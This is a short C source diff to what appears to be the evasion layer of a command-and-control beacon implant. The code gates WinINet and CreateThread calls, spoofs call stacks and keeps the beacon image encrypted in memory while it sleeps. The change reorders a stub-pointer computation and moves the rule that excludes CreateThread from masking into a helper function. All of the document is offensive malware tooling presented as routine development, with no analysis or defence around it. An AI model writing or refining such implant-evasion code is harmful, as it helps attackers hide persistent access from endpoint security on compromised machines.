@@ -83,10 +83,11 @@ extern "C" unsigned char gated_comms[];
  * (beacon_info_fill: MaskSection FALSE) - and jump on to the real API. */
 static void * gate_comms_stub(int api, void * fn)
 {
-	unsigned char * stub = gated_comms + GATE_COMMS_STRIDE * api;
+	unsigned char * stub;
 
 	if (api != GATE_API_INTERNETOPENA && api != GATE_API_INTERNETCONNECTA)
 		return fn;
+	stub = gated_comms + GATE_COMMS_STRIDE * api;
 	if (stub[0] != 0xFF || stub[1] != 0x25)
 		return fn;
 	*(void **)(stub + 8) = fn;
@@ -350,6 +351,11 @@ static int gate_mask_allowed(int api)
 	 * scrub. */
 	if (api != GATE_API_EXITTHREAD && gs_sleep() < 3000)
 		return 0;
+	/* CreateThread: the new thread may run beacon code (the CFG-safe
+	 * trampoline calls back into the image) while the image is ciphertext
+	 * - for every executor */
+	if (api == GATE_API_CREATETHREAD)
+		return 0;
 	return 1;
 }
 
@@ -437,10 +443,7 @@ unsigned long long gate_dispatch(FUNCTION_CALL * fc)
 			fc->retValue = gate_spoof_execute(&ctx);
 			done = 1;
 		}
-		else if (fc->bMask && fc->function != GATE_API_CREATETHREAD && gate_mask_run(fc)) {
-			/* CreateThread is left out: the new thread may run beacon code
-			 * (the CFG-safe trampoline calls back into the image) while the
-			 * image is ciphertext */
+		else if (fc->bMask && gate_mask_run(fc)) {
 			done = 1;
 		}
 	}
